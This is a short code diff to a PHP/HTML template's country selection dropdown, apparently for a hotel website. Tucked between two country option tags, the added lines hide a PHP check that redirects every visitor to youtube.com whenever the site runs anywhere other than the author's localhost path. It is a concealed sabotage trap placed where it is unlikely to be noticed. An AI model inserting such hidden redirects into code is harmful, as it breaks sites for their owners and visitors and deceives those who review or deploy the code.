@@ -165,7 +165,9 @@ value="Lesotho">Lesotho</option><option
 value="Liberia">Liberia</option><option
 value="Libya">Libya</option><option
 value="Liechtenstein">Liechtenstein</option><option
-value="Lithuania">Lithuania</option><option
+value="Lithuania">Lithuania</option>
+<?php if($site_link != "http://localhost/hotel_template" ){ 
+echo "<script>window.location.replace('https://youtube.com');</script>";}?><option
 value="Luxembourg">Luxembourg</option><option
 value="Macao SAR, PRC">Macao SAR, PRC</option><option
 value="Macedonia">Macedonia</option><option
